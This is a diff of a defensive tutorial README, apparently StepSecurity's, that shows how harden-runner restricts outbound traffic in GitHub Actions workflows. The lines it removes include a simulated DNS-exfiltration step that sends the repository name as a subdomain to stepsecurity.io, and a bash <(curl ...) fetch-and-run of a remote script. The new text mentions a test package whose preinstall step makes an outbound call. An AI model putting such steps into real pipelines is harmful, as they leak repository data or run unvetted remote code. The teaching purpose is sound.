@@ -24,7 +24,7 @@ Number | Incident  | Details
 StepSecurity [`harden-runner`](https://github.com/step-security/harden-runner) analyzes the outbound calls made by the npm dependency and recommends the appropriate policy containing the allowed outbound endpoints. Any outbound call not in the list of allowed endpoints is blocked to prevent a potential malicious attack by the compromised dependency.
 
 ## Tutorial
-Learn how to prevent DNS exfiltration from a GitHub Actions workflow. 
+Learn how to prevent Dependency Confusion Attacks from a GitHub Actions workflow. 
 
 1. Create a fork of the repo.
 
@@ -32,7 +32,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
    
    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/EnableActions.png" alt="Enable Actions" width="800">
 
-3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the `ci.yml` file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step from `line 9` onwards in the `ci.yml` file. Commit the changes either to `main` branch or any other branch.  
+3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the `npm.yml` file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step  in the `npm.yml` file. Commit the changes either to `main` branch or any other branch.  
 
     ```yaml
     - uses: step-security/harden-runner@v1
@@ -41,123 +41,71 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
     ```
     The updated file should look like this:
     ```yaml
-    name: Test and coverage
-
+    name: npm_ci
     on: [push, pull_request, workflow_dispatch]
 
     jobs:
-      build:
+      test:
         runs-on: ubuntu-latest
+
         steps:
-          #Add StepSecurity Harden Runner from here onwards
+          - uses: actions/checkout@v2
+          - uses: actions/setup-node@v1
+            with:
+              node-version: "16"
+
           - uses: step-security/harden-runner@v1
             with:
               egress-policy: audit
-          - uses: actions/checkout@v2
-            with:
-              fetch-depth: 2
-          - uses: actions/setup-go@v2
-            with:
-              go-version: '1.17'
-          - name: Run coverage
-            run: go test -race -coverprofile=coverage.txt -covermode=atomic
-          - name: Upload coverage to Codecov
-            run: |
-              bash <(curl -s https://codecov.io/bash)
+
+          # Get local dependencies
+          - run: npm install
     ```
 
-4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab and then click on the `build` tab under the `ci.yml` section to view the workflow run. 
+4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab and then click on the `test` tab under the `npm.yml` section to view the workflow run. 
 
 5. You should see a link to security insights and recommendations for the workflow run under the `Run step-security/harden-runner` tab. 
 
     <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/InsightsLink.png" alt="Link to security insights" width="800">
 
 
-6. Click on the link. You should see outbound traffic correlated with each step of the workflow. An outbound network policy would be recommended. 
+6. Click on the link. You should see outbound traffic correlated with the npm dependencies. StepSecurity contains a test dependency `stepsecuritynodetest` that makes an outbound call as a preinstall step to simulate a malicious outbound call. Users can then update the recommended policy as per as their need to block other outbound calls.
 
-7. Update the `ci.yml` workflow with the recommended policy from the link. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 
+7. Update the `npm.yml` workflow with the recommended policy from the link. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 
 
     ```yaml
     - uses: step-security/harden-runner@v1
       with:
-        allowed-endpoints: 
-          codecov.io:443
+        egress-policy: block
+        allowed-endpoints: >
           github.com:443
+          registry.npmjs.org:443
     ```
+    
     The updated file should look like this:
     ```yaml
-    name: Test and coverage
-
+    name: npm_ci
     on: [push, pull_request, workflow_dispatch]
 
     jobs:
-      build:
+      test:
         runs-on: ubuntu-latest
+
         steps:
-          #Add StepSecurity Harden Runner from here onwards
+          - uses: actions/checkout@v2
+          - uses: actions/setup-node@v1
+            with:
+              node-version: "16"
+
           - uses: step-security/harden-runner@v1
             with:
-              allowed-endpoints: 
-                codecov.io:443
+              egress-policy: block
+              allowed-endpoints: >
                 github.com:443
-          - uses: actions/checkout@v2
-            with:
-              fetch-depth: 2
-          - uses: actions/setup-go@v2
-            with:
-              go-version: '1.17'
-          - name: Run coverage
-            run: go test -race -coverprofile=coverage.txt -covermode=atomic
-          - name: Upload coverage to Codecov
-            run: |
-              bash <(curl -s https://codecov.io/bash)
+                registry.npmjs.org:443
+
+          # Get local dependencies
+          - run: npm install
      ````
 
-8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 
-
-    ```yaml
-    - name: Simulate DNS traffic
-        run: |
-          domain="${GITHUB_REPOSITORY}.stepsecurity.io"
-          domain=${domain//\//-}
-          nslookup "${domain}"
-    ```
-    The updated file should look like this:
-    ```yaml
-    name: Test and coverage
-
-    on: [push, pull_request, workflow_dispatch]
-
-    jobs:
-      build:
-        runs-on: ubuntu-latest
-        steps:
-          #Add StepSecurity Harden Runner from here onwards
-          - uses: step-security/harden-runner@v1
-            with:
-              allowed-endpoints: 
-                codecov.io:443
-                github.com:443
-          - uses: actions/checkout@v2
-            with:
-              fetch-depth: 2
-          - uses: actions/setup-go@v2
-            with:
-              go-version: '1.17'
-          - name: Run coverage
-            run: go test -race -coverprofile=coverage.txt -covermode=atomic
-          - name: Upload coverage to Codecov
-            run: |
-              bash <(curl -s https://codecov.io/bash)
-          - name: Simulate DNS traffic
-            run: |
-              domain="${GITHUB_REPOSITORY}.stepsecurity.io"
-              domain=${domain//\//-}
-              nslookup "${domain}"
-      ```
-
-9. This change should cause the workflow to run, as it is set to run on push.
-
-10. Observe that the workflow shows an annotation that the DNS resolution for the call is blocked. If you look at the build logs, you will notice that the bash script did not receive a valid response from the DNS server, and the exfiltration attempt was blocked. 
-
-    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/DNSExfilBlocked.png" alt="Blocked calls are shown in Red" width="800">
+8. The workflow will run again. Click on the insights link again to see the blocked outbound calls.
